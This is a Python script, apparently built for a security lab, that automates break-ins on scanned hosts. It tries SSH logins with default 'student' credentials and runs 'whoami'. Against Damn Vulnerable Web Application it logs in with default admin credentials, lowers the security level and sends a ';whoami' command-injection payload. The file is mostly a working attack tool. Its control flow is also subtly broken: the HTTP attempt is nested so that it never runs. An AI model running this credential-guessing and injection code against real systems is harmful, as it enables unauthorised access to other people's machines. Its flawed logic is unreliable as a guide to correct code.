import paramiko
from paramiko import SSHClient
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm

port_dict = {
    '22': 'ssh',
    '80': 'http',
    '8181': 'http',
    '8080': 'http',
    '3389': 'rdp'
}


class Breacher:
    def breach(self,
               services: dict):
        results = {}

        for ip in tqdm(list(services.keys())):
            ports = []
            for port in list(services[ip]):
                if port['state'] == 'open':
                    ports.append(port['port'])

            result = self.attempt(ip, ports)
            if result:
                results[ip] = result
        return results

    def attempt(self, ip, ports):
        for port in ports:
            port_service = port_dict[port]

            if port_service == 'ssh':
                if self.attempt_ssh(ip, port) == 'student':
                    return {'service': 'ssh', 'port': port}
                elif port_service == 'http':
                    if self.attempt_http(ip, port):
                        return {'service': 'http', 'port': port}
        return False

    @staticmethod
    def attempt_ssh(ip, port):
        try:
            client = SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username='student', password='student')
            stdin, stdout, stderr = client.exec_command('whoami')
            return stdout.read().decode('utf8').rstrip('\n')
        except Exception:
            return '0'

    def attempt_http(self, ip, port):
        try:
            response = requests.get(f'http://{ip}:{port}/dvwa/').text
            if 'Login :: Damn Vulnerable Web Application' in response:
                s = requests.Session()
                user_token = self.get_user_token(ip, port, s)
                login_result = self.login(ip, port, s, user_token)
                if not login_result:
                    return False
                result = self.change_security_level(ip, port, s, user_token)
                if not result:
                    return False
                return self.pwn_http(ip, port, s, user_token)
        except Exception:
            return False

    @staticmethod
    def get_user_token(ip, port, s):
        response = s.get(f'http://{ip}:{port}/dvwa/login.php').text
        if 'user_token' in response:
            soup = BeautifulSoup(response, 'html.parser')
            return soup.find("input", attrs={"name": "user_token"}).get('value')

    @staticmethod
    def login(ip, port, s, user_token):
        data = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token}
        response = s.post(f'http://{ip}:{port}/dvwa/login.php', data=data).text
        if 'Welcome :: Damn Vulnerable Web Application' in response:
            return True
        return False

    @staticmethod
    def change_security_level(ip, port, s, user_token):
        data = {'security': 'low', 'seclev_submit': 'Submit', 'user_token': user_token}
        result = s.post(f'http://{ip}:{port}/dvwa/security.php', data=data)
        if s.cookies['security'] == 'low':
            return True
        return False

    @staticmethod
    def pwn_http(ip, port, s, user_token):
        data = {'ip': ';whoami', 'Submit': 'Submit', 'user_token': user_token}
        result = s.post(f'http://{ip}:{port}/dvwa/vulnerabilities/exec/', data=data).text
        soup = BeautifulSoup(result, 'html.parser')
        if soup.find('pre').text.rstrip('\n') == 'www-data':
            return True
        return False
